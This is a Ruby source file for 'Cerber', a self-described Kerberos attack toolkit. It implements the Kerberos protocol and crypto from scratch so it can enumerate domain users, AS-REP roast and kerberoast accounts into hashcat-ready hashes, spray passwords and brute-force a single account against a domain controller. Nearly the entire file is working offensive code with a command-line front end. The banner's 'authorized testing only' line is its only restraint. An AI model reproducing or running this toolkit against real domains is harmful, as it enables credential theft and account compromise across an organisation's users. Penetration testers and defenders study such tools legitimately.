#!/usr/bin/env ruby
# Cerber - Kerberos attack toolkit in pure Ruby. No gems, no impacket.
# asrep roasting, kerberoasting, user enumeration, password spray - straight
# against the KDC over port 88.

require 'socket'
require 'openssl'
require 'optparse'
require 'timeout'

module Cerber

# ---------------------------------------------------------------------------
# minimal ASN.1 DER - encode/decode just what Kerberos needs

module ASN1
  module_function

  def der_len(len)
    return [len].pack('C') if len < 0x80
    bytes = []
    while len > 0
      bytes.unshift(len & 0xFF)
      len >>= 8
    end
    [0x80 | bytes.size].pack('C') + bytes.pack('C*')
  end

  def tlv(tag, content)
    [tag].pack('C') + der_len(content.bytesize) + content
  end

  def seq(*parts)   = tlv(0x30, parts.join)
  def app(n, c)     = tlv(0x60 + n, c)
  def ctx(n, c)     = tlv(0xA0 + n, c)
  def int(v)        = tlv(0x02, der_int(v))
  def octets(s)     = tlv(0x04, s)
  def bits(v)       = tlv(0x03, "\x00" + [v].pack('N'))
  def gtime(t)      = tlv(0x18, t.utc.strftime('%Y%m%d%H%M%SZ'))
  def gstring(s)    = tlv(0x1B, s)
  def ustring(s)    = tlv(0x1C, s)

  def der_int(v)
    if v.negative?
      # two's complement, minimal width
      width = 1
      width += 1 while v < -(1 << (width * 8 - 1))
      return (v + (1 << (width * 8))).to_s(16).rjust(width * 2, '0').scan(/../).map { |h| h.to_i(16) }.pack('C*')
    end
    bytes = []
    loop do
      bytes.unshift(v & 0xFF)
      v >>= 8
      break if v.zero?
    end
    bytes << 0 if bytes[0] & 0x80 != 0
    bytes.pack('C*')
  end

  class Reader
    attr_reader :tag, :value

    def initialize(data)
      @tag = data.getbyte(0)
      len_byte = data.getbyte(1)
      if len_byte & 0x80 == 0
        @len = len_byte
        off = 2
      else
        n = len_byte & 0x7F
        @len = data[2, n].bytes.reduce(0) { |a, x| (a << 8) | x }
        off = 2 + n
      end
      @value = data[off, @len] || ''.b
      @consumed = off + @len
    end

    def consumed = @consumed

    # context/app tag number for constructed tags
    def tag_num = @tag & 0x1F

    def ctx?(n)  = (@tag & 0xE0) == 0xA0 && tag_num == n
    def app?(n)  = (@tag & 0xE0) == 0x60 && tag_num == n
    def seq?     = @tag == 0x30

    def children
      out = []
      pos = 0
      while pos < @value.bytesize
        r = Reader.new(@value.byteslice(pos..))
        out << r
        pos += r.consumed
      end
      out
    end

    def find_ctx(n)
      children.find { |c| c.ctx?(n) }&.then { |c| Reader.new(c.value) }
    end

    def to_int
      v = 0
      @value.each_byte { |b| v = (v << 8) | b }
      v
    end
  end

  def read(data) = Reader.new(data)
end

# ---------------------------------------------------------------------------
# crypto: pure-ruby MD4 and RC4 (OpenSSL 3 dropped both), AES-CTS on top of
# OpenSSL ECB, string2key per RFC 3961/3962 and RC4-HMAC per MS-KILE

module Crypto
  module_function

  # - MD4 (pure ruby, rfc 1320) --------------------------------------------

  def md4(data)
    s = data.b
    bitlen = s.bytesize * 8
    s += "\x80".b
    s += "\x00".b while (s.bytesize % 64) != 56
    s += [bitlen].pack('Q<')

    a, b, c, d = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    mask = 0xFFFFFFFF
    rol = ->(v, n) { ((v << n) | (v >> (32 - n))) & mask }

    s.bytes.each_slice(64) do |blk|
      x = blk.pack('C*').unpack('V16')
      aa, bb, cc, dd = a, b, c, d
      f = ->(x_, y_, z_) { (x_ & y_) | (~x_ & z_) }
      g = ->(x_, y_, z_) { (x_ & y_) | (x_ & z_) | (y_ & z_) }
      h = ->(x_, y_, z_) { x_ ^ y_ ^ z_ }

      # round 1
      [0, 1, 2, 3].each do |i|
        a = rol.call((a + f.call(b, c, d) + x[i * 4 + 0]) & mask, 3)
        d = rol.call((d + f.call(a, b, c) + x[i * 4 + 1]) & mask, 7)
        c = rol.call((c + f.call(d, a, b) + x[i * 4 + 2]) & mask, 11)
        b = rol.call((b + f.call(c, d, a) + x[i * 4 + 3]) & mask, 19)
      end
      # round 2
      [0, 1, 2, 3].each do |i|
        a = rol.call((a + g.call(b, c, d) + x[i] + 0x5A827999) & mask, 3)
        d = rol.call((d + g.call(a, b, c) + x[i + 4] + 0x5A827999) & mask, 5)
        c = rol.call((c + g.call(d, a, b) + x[i + 8] + 0x5A827999) & mask, 9)
        b = rol.call((b + g.call(c, d, a) + x[i + 12] + 0x5A827999) & mask, 13)
      end
      # round 3
      [0, 1, 2, 3].each do |i|
        a = rol.call((a + h.call(b, c, d) + x[[0, 2, 1, 3][i]] + 0x6ED9EBA1) & mask, 3)
        d = rol.call((d + h.call(a, b, c) + x[[8, 10, 9, 11][i]] + 0x6ED9EBA1) & mask, 9)
        c = rol.call((c + h.call(d, a, b) + x[[4, 6, 5, 7][i]] + 0x6ED9EBA1) & mask, 11)
        b = rol.call((b + h.call(c, d, a) + x[[12, 14, 13, 15][i]] + 0x6ED9EBA1) & mask, 15)
      end
      a = (a + aa) & mask
      b = (b + bb) & mask
      c = (c + cc) & mask
      d = (d + dd) & mask
    end
    [a, b, c, d].pack('V4')
  end

  # - RC4 (pure ruby) -------------------------------------------------------

  def rc4(key, data)
    s = (0..255).to_a
    j = 0
    256.times do |i|
      j = (j + s[i] + key.getbyte(i % key.bytesize)) & 0xFF
      s[i], s[j] = s[j], s[i]
    end
    out = ''.b
    i = j = 0
    data.each_byte do |byte|
      i = (i + 1) & 0xFF
      j = (j + s[i]) & 0xFF
      s[i], s[j] = s[j], s[i]
      out << (byte ^ s[(s[i] + s[j]) & 0xFF])
    end
    out
  end

  def md5(data) = OpenSSL::Digest.new('MD5').digest(data)
  def hmac_md5(key, data) = OpenSSL::HMAC.digest(OpenSSL::Digest.new('MD5'), key, data)
  def hmac_sha1(key, data) = OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA1'), key, data)

  # - AES primitives --------------------------------------------------------

  def aes_ecb_enc(key, block)
    c = OpenSSL::Cipher.new("aes-#{key.bytesize * 8}-ecb")
    c.encrypt
    c.key = key
    c.padding = 0
    c.update(block) + c.final
  end

  def aes_ecb_dec(key, block)
    c = OpenSSL::Cipher.new("aes-#{key.bytesize * 8}-ecb")
    c.decrypt
    c.key = key
    c.padding = 0
    c.update(block) + c.final
  end

  # n-fold per rfc 3961 section 5.1:
  # replicate input to lcm(in,out) rotating each copy right by 13 bits,
  # then fold into out_len bytes with big-endian ones-complement addition

  def rotate_right_13bits(bytes)
    nbits = bytes.bytesize * 8
    out = Array.new(bytes.bytesize, 0)
    bytes.each_byte.with_index do |b, bi|
      8.times do |bit|
        val = (b >> (7 - bit)) & 1
        dst = (bi * 8 + bit + 13) % nbits
        out[dst / 8] |= val << (7 - (dst % 8))
      end
    end
    out.pack('C*')
  end

  def nfold(data, out_len)
    state = data.b
    lcm_len = data.bytesize.lcm(out_len)
    tmp = ''.b
    while tmp.bytesize < lcm_len
      tmp += state                    # copy i is rotated 13*i bits - first copy stays as-is
      state = rotate_right_13bits(state)
    end
    tmp = tmp[0, lcm_len]

    out = Array.new(out_len, 0)
    carry = 0
    (lcm_len - 1).downto(0) do |j|
      k = j % out_len
      sum = out[k] + tmp.getbyte(j) + carry
      out[k] = sum & 0xFF
      carry = sum >> 8
    end
    while carry.positive?
      (out_len - 1).downto(0) do |j|
        sum = out[j] + carry
        out[j] = sum & 0xFF
        carry = sum >> 8
        break if carry.zero?
      end
    end
    out.pack('C*')
  end

  # - kerberos key derivation ----------------------------------------------

  # DR per rfc 3961 5.1: repeatedly encrypt - k1 = E(key, nfold), k2 = E(key, k1)...
  def dr(key, constant, block_bytes = 16)
    block = nfold(constant, block_bytes)
    out = ''.b
    while out.bytesize < key.bytesize
      block = aes_ecb_enc(key, block)
      out += block
    end
    out[0, key.bytesize]
  end

  # DK = random-to-key(DR(...)); for aes random-to-key is identity
  def dk(key, constant)
    dr(key, constant)
  end

  # string2key aes256 (etype 18) / aes128 (etype 17) per rfc 3962
  def string2key_aes(password, salt, key_bytes, iterations = 4096)
    tkey = OpenSSL::PKCS5.pbkdf2_hmac_sha1(password.b, salt.b, iterations, key_bytes)
    dk(tkey, 'kerberos'.b)
  end

  # rc4-hmac base key (etype 23) = md4 of utf16le password
  def string2key_rc4(password)
    md4(password.encode('UTF-16LE').b)
  end

  # - aes cts (rfc 3962): cbc with ciphertext stealing, last two blocks ----
  # swapped; the final block is truncated to the plaintext remainder

  def xor(a, b)
    a.bytes.zip(b.bytes).map { |x, y| (x ^ y).chr }.join.b
  end

  def slice16(data)
    data.bytes.each_slice(16).map { |s| s.pack('C*') }
  end

  def aes_cts_encrypt(key, data)
    blocks = slice16(data)
    return aes_ecb_enc(key, blocks[0]) if blocks.size == 1
    cs = []
    prev = "\x00".b * 16
    blocks.each do |p|
      prev = aes_ecb_enc(key, xor(p.ljust(16, "\x00".b), prev))
      cs << prev
    end
    last_len = blocks[-1].bytesize
    cs[0..-3].join + cs[-1] + cs[-2][0, last_len]
  end

  def aes_cts_decrypt(key, data)
    blocks = slice16(data)
    return aes_ecb_dec(key, blocks[0]) if blocks.size == 1
    d = blocks[-1].bytesize
    a = blocks[-2]                      # full ciphertext of the last block
    b = blocks[-1]                      # truncated previous block
    x = aes_ecb_dec(key, a)             # = (Pn || zeros) XOR C[n-1]
    cn1 = b + x[d..]                    # rebuild C[n-1]
    pn = xor(x[0...d], b)
    out = []
    prev = "\x00".b * 16
    (blocks[0..-3] + [cn1]).each do |c|
      out << xor(aes_ecb_dec(key, c), prev)
      prev = c
    end
    out.join + pn
  end

  # - kerberos encryption profiles ------------------------------------------

  # aes cts-hmac-sha1-96 (etypes 17/18)
  def aes_encrypt(base_key, usage, plaintext)
    ke = dk(base_key, [usage].pack('N') + "\xAA".b)
    ki = dk(base_key, [usage].pack('N') + "\x55".b)
    conf = OpenSSL::Random.random_bytes(16)
    data = conf + plaintext
    ct = aes_cts_encrypt(ke, data)
    ct + hmac_sha1(ki, data)[0, 12]
  end

  def aes_decrypt(base_key, usage, blob)
    ke = dk(base_key, [usage].pack('N') + "\xAA".b)
    ki = dk(base_key, [usage].pack('N') + "\x55".b)
    ct = blob[0...-12]
    hmac = blob[-12..]
    pt = aes_cts_decrypt(ke, ct)
    raise 'integrity check failed (wrong password?)' unless hmac_sha1(ki, pt)[0, 12] == hmac
    pt[16..] # strip confounder
  end

  # rc4-hmac (etype 23)
  def rc4_hmac_encrypt(base_key, usage, plaintext)
    k1 = hmac_md5(base_key, [usage].pack('V'))
    conf = OpenSSL::Random.random_bytes(8)
    data = conf + plaintext
    cksum = hmac_md5(k1, data)
    k3 = hmac_md5(k1, cksum)
    cksum + rc4(k3, data)
  end

  def rc4_hmac_decrypt(base_key, usage, blob)
    k1 = hmac_md5(base_key, [usage].pack('V'))
    cksum = blob[0, 16]
    ct = blob[16..]
    k3 = hmac_md5(k1, cksum)
    data = rc4(k3, blob[16..])
    raise 'integrity check failed (wrong password?)' unless hmac_md5(k1, data) == cksum
    data[8..] # strip confounder
  end

  def encrypt(etype, key, usage, plaintext)
    case etype
    when 17, 18 then aes_encrypt(key, usage, plaintext)
    when 23 then rc4_hmac_encrypt(key, usage, plaintext)
    else raise "unsupported etype #{etype}"
    end
  end

  # checksum profiles for the tgs authenticator (rfc 3961 get_mic)
  def cksum_type(etype)
    case etype
    when 17 then 15   # hmac-sha1-96-aes128
    when 18 then 16   # hmac-sha1-96-aes256
    when 23 then -138 # hmac-md5-rc4
    end
  end

  def checksum(etype, key, usage, data)
    case etype
    when 17, 18
      kc = dk(key, [usage].pack('N') + "\x99".b)
      hmac_sha1(kc, data)[0, 12]
    when 23
      kc = hmac_md5(key, [usage].pack('V'))
      hmac_md5(kc, data)
    end
  end

  def decrypt(etype, key, usage, blob)
    case etype
    when 17, 18 then aes_decrypt(key, usage, blob)
    when 23 then rc4_hmac_decrypt(key, usage, blob)
    else raise "unsupported etype #{etype}"
    end
  end
end
end

# ---------------------------------------------------------------------------
# kerberos protocol: kdc transport and message building/parsing

module Cerber::Krb
  module_function

  USAGE_AS_REQ_TIMESTAMP = 1
  USAGE_AS_REP_ENC = 3
  USAGE_TGS_REQ_CKSUM = 6
  USAGE_TGS_REQ_AUTH = 7
  USAGE_TGS_REP_ENC = 8

  ERR_PREAUTH_REQUIRED = 25
  ERR_PRINCIPAL_UNKNOWN = 6
  ERR_PREAUTH_FAILED = 24
  ERR_CLIENT_REVOKED = 18

  def send_kdc(host, port, data, timeout: 5)
    # tcp: 4-byte big-endian length prefix
    begin
      Timeout.timeout(timeout) do
        sock = TCPSocket.new(host, port)
        sock.write([data.bytesize].pack('N') + data)
        raw_len = sock.read(4)&.unpack1('N')
        raise 'short read' unless raw_len
        body = sock.read(raw_len)
        sock.close
        return body
      end
    rescue StandardError
      # udp fallback
      sock = UDPSocket.new
      sock.connect(host, port)
      sock.send(data, 0)
      resp, = Timeout.timeout(timeout) { sock.recvfrom(65535) }
      sock.close
      resp
    end
  end

  def principal(name, type)
    parts = name.split('/')
    Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.int(type)),
      Cerber::ASN1.ctx(1, Cerber::ASN1.seq(parts.map { |p| Cerber::ASN1.gstring(p) }.join))
    )
  end

  def nonce = rand(0x40000000..0x7FFFFFFF)

  def req_body(realm:, cname:, sname:, etypes: [18, 17, 23], options: 0x50810010, rtime: false)
    Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.bits(options)),
      cname ? Cerber::ASN1.ctx(1, cname) : ''.b,
      Cerber::ASN1.ctx(2, Cerber::ASN1.gstring(realm)),
      Cerber::ASN1.ctx(3, sname),
      Cerber::ASN1.ctx(5, Cerber::ASN1.gtime(Time.now + 3600 * 8)),  # till
      rtime ? Cerber::ASN1.ctx(6, Cerber::ASN1.gtime(Time.now + 3600 * 24 * 7)) : ''.b,
      Cerber::ASN1.ctx(7, Cerber::ASN1.int(nonce)),
      Cerber::ASN1.ctx(8, Cerber::ASN1.seq(etypes.map { |e| Cerber::ASN1.int(e) }.join))
    )
  end

  def as_req(realm:, user:, padata: nil, sname: nil)
    sname ||= principal('krbtgt/' + realm, 2)
    body = req_body(realm: realm, cname: principal(user, 1), sname: sname)
    Cerber::ASN1.app(10,
      Cerber::ASN1.seq(
        Cerber::ASN1.ctx(1, Cerber::ASN1.int(5)),
        Cerber::ASN1.ctx(2, Cerber::ASN1.int(10)),
        padata ? Cerber::ASN1.ctx(3, Cerber::ASN1.seq(padata)) : ''.b,
        Cerber::ASN1.ctx(4, body)
      ))
  end

  def pa_enc_timestamp(etype, key)
    ts_enc = Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.gtime(Time.now)),
      Cerber::ASN1.ctx(1, Cerber::ASN1.int(rand(0..999999)))
    )
    blob = Cerber::Crypto.encrypt(etype, key, USAGE_AS_REQ_TIMESTAMP, ts_enc)
    enc_data = Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.int(etype)),
      Cerber::ASN1.ctx(2, Cerber::ASN1.octets(blob))
    )
    Cerber::ASN1.seq(Cerber::ASN1.ctx(1, Cerber::ASN1.int(2)), Cerber::ASN1.ctx(2, Cerber::ASN1.octets(enc_data)))
  end

  # - parsing ---------------------------------------------------------------

  class KdcError < StandardError
    attr_reader :code
    def initialize(code, msg) = (super(msg); @code = code)
  end

  def parse_error(data)
    r = Cerber::ASN1.read(data)
    return nil unless r.app?(30)
    body = Cerber::ASN1.read(r.value)               # the KRB-ERROR sequence
    code = nil
    etext = nil
    body.children.each do |c|
      if c.ctx?(6)
        code = Cerber::ASN1.read(c.value).to_int
      elsif c.ctx?(12)
        etext = Cerber::ASN1.read(c.value).value
      end
    end
    [code, etext]
  end

  # returns { ticket:, enc_etype:, enc_data:, etype_info_salt: }
  def parse_rep(data)
    err = parse_error(data)
    raise KdcError.new(err[0], "kdc error #{err[0]} (#{err[1]})") if err

    r = Cerber::ASN1.read(data)
    raise 'not a reply' unless r.app?(11) || r.app?(13)
    body = Cerber::ASN1.read(r.value)
    ticket = nil
    enc = nil
    salt = nil
    body.children.each do |c|
      case c.tag_num
      when 2 then salt ||= parse_etype_info2(c.value)
      when 5 then ticket = c.value                     # ticket (app 1 raw)
      when 6 then enc = Cerber::ASN1.read(c.value)
      end
    end
    raise 'no enc-part in reply' unless enc
    etype = nil
    cipher = nil
    enc.children.each do |c|
      case c.tag_num
      when 0 then etype = Cerber::ASN1.read(c.value).to_int
      when 2 then cipher = Cerber::ASN1.read(c.value).value
      end
    end
    { ticket: ticket, enc_etype: etype, enc_data: cipher, salt: salt }
  end

  def parse_etype_info2(padata_seq)
    Cerber::ASN1.read(padata_seq).children.each do |entry|
      e = Cerber::ASN1.read(entry.value)
      next unless e.ctx?(2)
      info = Cerber::ASN1.read(e.children.first.value)
      # ETYPE-INFO2-ENTRY: ctx0 etype, ctx1 salt
      info.children.each do |f|
        return Cerber::ASN1.read(f.value).value if f.ctx?(1)
      end
    end
    nil
  rescue StandardError
    nil
  end

  # decrypt AS-REP enc-part -> session key (for tgs requests)
  # rc4-hmac quirk (MS-KILE): as-rep enc-part uses usage 8, not 3
  def session_key_from_as_rep(rep, etype, user_key)
    usage = etype == 23 ? 8 : USAGE_AS_REP_ENC
    plain = Cerber::Crypto.decrypt(etype, user_key, usage, rep[:enc_data])
    body = Cerber::ASN1.read(Cerber::ASN1.read(plain).value)          # app 25 / enc part
    key_field = body.children.find { |c| c.ctx?(0) }
    key_seq = Cerber::ASN1.read(key_field.value)
    key_octets = nil
    key_seq.children.each do |c|
      key_octets = Cerber::ASN1.read(c.value).value if c.ctx?(1)
    end
    raise 'no session key in as-rep' unless key_octets
    key_octets
  end
end

# ---------------------------------------------------------------------------
# attacks

module Cerber::Attacks
  module_function

  def enum(dc, port, realm, user)
    resp = Cerber::Krb.send_kdc(dc, port, Cerber::Krb.as_req(realm: realm, user: user))
    r = Cerber::ASN1.read(resp)
    return :roastable if r.app?(11)          # as-rep without preauth - golden
    code, = Cerber::Krb.parse_error(resp)
    case code
    when Cerber::Krb::ERR_PREAUTH_REQUIRED then :exists
    when Cerber::Krb::ERR_PRINCIPAL_UNKNOWN then :no
    when Cerber::Krb::ERR_CLIENT_REVOKED then :locked
    else :unknown
    end
  rescue StandardError
    :error
  end

  def asrep_hash(dc, port, realm, user)
    resp = Cerber::Krb.send_kdc(dc, port, Cerber::Krb.as_req(realm: realm, user: user))
    rep = Cerber::Krb.parse_rep(resp)
    etype = rep[:enc_etype]
    c = rep[:enc_data]
    case etype
    when 23
      "$krb5asrep$23$#{user}@#{realm}:#{c[0, 16].unpack1('H*')}$#{c[16..].unpack1('H*')}"
    when 17, 18
      "$krb5asrep$#{etype}$#{user}$#{realm}$#{c[-12..].unpack1('H*')}$#{c[0...-12].unpack1('H*')}"
    end
  rescue Cerber::Krb::KdcError => e
    nil if e.code == Cerber::Krb::ERR_PREAUTH_REQUIRED
  end

  # returns {session_key:, session_etype:, ticket:} or raises
  def get_tgt(dc, port, realm, user, password)
    errors = []
    [18, 17, 23].each do |etype|
      key = etype == 23 ? Cerber::Crypto.string2key_rc4(password) : Cerber::Crypto.string2key_aes(password, "#{realm}#{user}", etype == 17 ? 16 : 32)
      begin
        pa = Cerber::Krb.pa_enc_timestamp(etype, key)
        resp = Cerber::Krb.send_kdc(dc, port, Cerber::Krb.as_req(realm: realm, user: user, padata: pa))
        rep = Cerber::Krb.parse_rep(resp)
        session = Cerber::Krb.session_key_from_as_rep(rep, rep[:enc_etype], key)
        return { session_key: session, session_etype: rep[:enc_etype], ticket: rep[:ticket], key: key, key_etype: rep[:enc_etype] }
      rescue Cerber::Krb::KdcError => e
        raise if e.code == Cerber::Krb::ERR_PRINCIPAL_UNKNOWN || e.code == Cerber::Krb::ERR_CLIENT_REVOKED
        errors << "etype#{etype}: #{e.message}"
      rescue StandardError => e
        errors << "etype#{etype}: #{e.message}"
      end
    end
    raise Cerber::Krb::KdcError.new(Cerber::Krb::ERR_PREAUTH_FAILED, "auth failed - " + errors.join("; "))
  end

  def tgs_req(dc, port, realm, user, tgt, spn)
    # body first - the authenticator must carry a checksum of these exact bytes
    body = Cerber::Krb.req_body(realm: realm, cname: nil, sname: Cerber::Krb.principal(spn, 1), options: 0x00810000)

    cksum = Cerber::Crypto.checksum(tgt[:session_etype], tgt[:session_key], Cerber::Krb::USAGE_TGS_REQ_CKSUM, body)
    cksum_field = Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.int(Cerber::Crypto.cksum_type(tgt[:session_etype]))),
      Cerber::ASN1.ctx(1, Cerber::ASN1.octets(cksum))
    )

    ctime = Time.now
    # Authenticator ::= [APPLICATION 2] SEQUENCE {
    #   vno[0], crealm[1], cname[2], cksum[3], cusec[4], ctime[5], subkey[6] }
    cksum = Cerber::Crypto.checksum(tgt[:session_etype], tgt[:session_key], Cerber::Krb::USAGE_TGS_REQ_CKSUM, body)
    cksum_field = Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.int(Cerber::Crypto.cksum_type(tgt[:session_etype]))),
      Cerber::ASN1.ctx(1, Cerber::ASN1.octets(cksum))
    )
    authenticator = Cerber::ASN1.app(2, Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.int(5)),
      Cerber::ASN1.ctx(1, Cerber::ASN1.gstring(realm)),
      Cerber::ASN1.ctx(2, Cerber::Krb.principal(user, 1)),
      Cerber::ASN1.ctx(3, cksum_field),
      Cerber::ASN1.ctx(4, Cerber::ASN1.int(ctime.usec)),
      Cerber::ASN1.ctx(5, Cerber::ASN1.gtime(ctime))
    ))
    auth_blob = Cerber::Crypto.encrypt(tgt[:session_etype], tgt[:session_key], Cerber::Krb::USAGE_TGS_REQ_AUTH, authenticator)
    auth_enc = Cerber::ASN1.seq(
      Cerber::ASN1.ctx(0, Cerber::ASN1.int(tgt[:session_etype])),
      Cerber::ASN1.ctx(2, Cerber::ASN1.octets(auth_blob))
    )
    # AP-REQ fields are tagged [0..4]: pvno, msg-type, ap-options, ticket, authenticator
    ap_req = Cerber::ASN1.app(14,
      Cerber::ASN1.seq(
        Cerber::ASN1.ctx(0, Cerber::ASN1.int(5)),
        Cerber::ASN1.ctx(1, Cerber::ASN1.int(14)),
        Cerber::ASN1.ctx(2, Cerber::ASN1.bits(0)),
        Cerber::ASN1.ctx(3, tgt[:ticket]),
        Cerber::ASN1.ctx(4, auth_enc)
      ))
    pa = Cerber::ASN1.seq(Cerber::ASN1.ctx(1, Cerber::ASN1.int(1)), Cerber::ASN1.ctx(2, Cerber::ASN1.octets(ap_req)))

    tgs = Cerber::ASN1.app(12,
      Cerber::ASN1.seq(
        Cerber::ASN1.ctx(1, Cerber::ASN1.int(5)),
        Cerber::ASN1.ctx(2, Cerber::ASN1.int(12)),
        Cerber::ASN1.ctx(3, Cerber::ASN1.seq(pa)),
        Cerber::ASN1.ctx(4, body)
      ))
    Cerber::Krb.send_kdc(dc, port, tgs)
  end

  def user_for(spn)
    # kdc salt = realm + principal components with no separator
    spn.include?("|") ? spn.split("|", 2).first : spn.delete("/")
  end

  def spn_of(spn)
    spn.include?("|") ? spn.split("|", 2).last : spn
  end

  def tgs_hash(dc, port, realm, user, tgt, spn)
    resp = tgs_req(dc, port, realm, user, tgt, spn_of(spn))
    rep = Cerber::Krb.parse_rep(resp)
    # service ticket lives in rep[:ticket] - app(1) with enc-part inside
    ticket = Cerber::ASN1.read(rep[:ticket])
    enc = nil
    Cerber::ASN1.read(ticket.value).children.each do |c|
      enc = Cerber::ASN1.read(c.value) if c.tag_num == 3
    end
    raise 'no ticket enc-part' unless enc
    etype = nil
    cipher = nil
    enc.children.each do |c|
      case c.tag_num
      when 0 then etype = Cerber::ASN1.read(c.value).to_int
      when 2 then cipher = Cerber::ASN1.read(c.value).value
      end
    end
    # the salt for offline cracking is realm + account name; without an ldap
    # lookup the SPN itself stands in as the account (right on MIT-style realms,
    # and on AD when the list carries account|spn pairs)
    account = user_for(spn)
    case etype
    when 23
      "$krb5tgs$23$*#{account}$#{realm}$#{spn}*$#{cipher[0, 16].unpack1('H*')}#{cipher[16..].unpack1('H*')}"
    when 17, 18
      "$krb5tgs$#{etype}$#{account}$#{realm}$*#{spn}*$#{cipher[-12..].unpack1('H*')}$#{cipher[0...-12].unpack1('H*')}"
    end
  end

  def spray(dc, port, realm, user, password)
    get_tgt(dc, port, realm, user, password)
    :valid
  rescue Cerber::Krb::KdcError => e
    case e.code
    when Cerber::Krb::ERR_PRINCIPAL_UNKNOWN then :no_user
    when Cerber::Krb::ERR_CLIENT_REVOKED then :locked
    else :invalid
    end
  end
end

# ---------------------------------------------------------------------------
# cli

module Cerber
  VERSION = '1.0.0'

  BANNER = <<~ART
     ██████╗███████╗██████╗ ██████╗ ███████╗██████╗
    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝
    ██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ╚██████╗███████╗██║  ██║██████╔╝███████╗██║  ██║
     ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
  ART

  def self.color(text, code)
    return text unless $stdout.tty?
    "\e[#{code}m#{text}\e[0m"
  end

  def self.banner
    puts color(BANNER, '35;1')
    puts color("  kerberos attack toolkit v#{VERSION} - pure ruby, no impacket", '2')
    puts color('  authorized testing only', '2')
    puts
  end

  def self.load_list(path)
    File.readlines(path).map(&:strip).reject { |l| l.empty? || l.start_with?('#') }
  end

  def self.run(argv)
    cmd = argv.shift
    opts = { port: 88 }
    OptionParser.new do |o|
      o.on('--dc HOST') { |v| opts[:dc] = v }
      o.on('--port N', Integer) { |v| opts[:port] = v }
      o.on('--realm R') { |v| opts[:realm] = v&.upcase }
      o.on('--user U') { |v| opts[:user] = v }
      o.on('--pass P') { |v| opts[:pass] = v }
      o.on('--out FILE') { |v| opts[:out] = v }
    end.parse!(argv)

    banner
    need = ->(k) { opts[k] || (puts color("[!] missing --#{k}", '31'); exit 2) }

    case cmd
    when 'enum'
      need.call(:dc); need.call(:realm)
      users = argv[0] ? load_list(argv[0]) : []
      puts color("[*] enumerating #{users.size} users against #{opts[:dc]} (#{opts[:realm]})", '36')
      users.each do |u|
        case Attacks.enum(opts[:dc], opts[:port], opts[:realm], u)
        when :exists then puts "  #{color('[hit]', '32')} #{u}"
        when :roastable then puts "  #{color('[hit+]', '35;1')} #{u} #{color('(no preauth - roastable)', '33')}"
        when :locked then puts "  #{color('[lock]', '33')} #{u}"
        when :no then puts "  #{color('[---]', '2')} #{u}" if opts[:verbose]
        end
      end

    when 'asrep'
      need.call(:dc); need.call(:realm)
      users = argv[0] ? load_list(argv[0]) : [opts[:user]].compact
      out = opts[:out] ? File.open(opts[:out], 'a') : nil
      puts color("[*] as-rep roasting #{users.size} users (#{opts[:realm]})", '36')
      users.each do |u|
        hash = Attacks.asrep_hash(opts[:dc], opts[:port], opts[:realm], u)
        if hash
          puts "  #{color('[roast]', '35;1')} #{u}"
          puts hash
          out&.puts(hash)
        end
      end
      out&.close
      puts color("[+] hashes saved to #{opts[:out]} - hashcat -m 18200/19800/19900", '32') if out

    when 'tgs'
      need.call(:dc); need.call(:realm); need.call(:user); need.call(:pass)
      spns = argv[0] ? load_list(argv[0]) : []
      if spns.empty?
        puts color('[!] provide an SPN list file (service/host per line)', '31')
        exit 2
      end
      puts color("[*] getting tgt for #{opts[:user]}@#{opts[:realm]}", '36')
      tgt = Attacks.get_tgt(opts[:dc], opts[:port], opts[:realm], opts[:user], opts[:pass])
      puts color('[+] tgt acquired', '32')
      out = opts[:out] ? File.open(opts[:out], 'a') : nil
      spns.each do |spn|
        begin
          hash = Attacks.tgs_hash(opts[:dc], opts[:port], opts[:realm], opts[:user], tgt, spn)
          puts "  #{color('[roast]', '35;1')} #{spn}"
          puts hash
          out&.puts(hash)
        rescue StandardError => e
          puts "  #{color('[fail]', '31')} #{spn} - #{e.message}"
        end
      end
      out&.close
      puts color("[+] hashes saved to #{opts[:out]} - hashcat -m 13100/19700", '32') if out

    when 'spray'
      need.call(:dc); need.call(:realm); need.call(:pass)
      users = argv[0] ? load_list(argv[0]) : [opts[:user]].compact
      puts color("[*] spraying '#{opts[:pass]}' across #{users.size} users via as-req", '36')
      users.each do |u|
        case Attacks.spray(opts[:dc], opts[:port], opts[:realm], u, opts[:pass])
        when :valid then puts "  #{color('[VALID]', '32;1')} #{u}:#{opts[:pass]}"
        when :locked then puts "  #{color('[lock]', '33')} #{u}"
        when :no_user then nil
        end
      end

    when 'brute'
      need.call(:dc); need.call(:realm); need.call(:user)
      passes = argv[0] ? load_list(argv[0]) : []
      puts color("[*] brute-forcing #{opts[:user]}@#{opts[:realm]} (#{passes.size} candidates)", '36')
      passes.each do |p|
        case Attacks.spray(opts[:dc], opts[:port], opts[:realm], opts[:user], p)
        when :valid
          puts "  #{color('[VALID]', '32;1')} #{opts[:user]}:#{p}"
          return
        when :locked
          puts color('[!] account locked - stopping', '31')
          return
        end
      end
      puts color('[-] no match', '31')

    else
      puts <<~USAGE
        usage: cerber <command> [options]

        commands:
          enum    users.txt --dc IP --realm DOM     user enumeration via as-req error codes
          asrep   users.txt --dc IP --realm DOM     as-rep roast (no preauth needed)
          tgs     spns.txt  --dc IP --realm DOM --user U --pass P   kerberoast
          spray   users.txt --dc IP --realm DOM --pass P            password spray
          brute   passes.txt --dc IP --realm DOM --user U           single-user brute

        options: --dc, --port (default 88), --realm, --user, --pass, --out
      USAGE
      exit 2
    end
  end
end

Cerber.run(ARGV) if __FILE__ == $PROGRAM_NAME
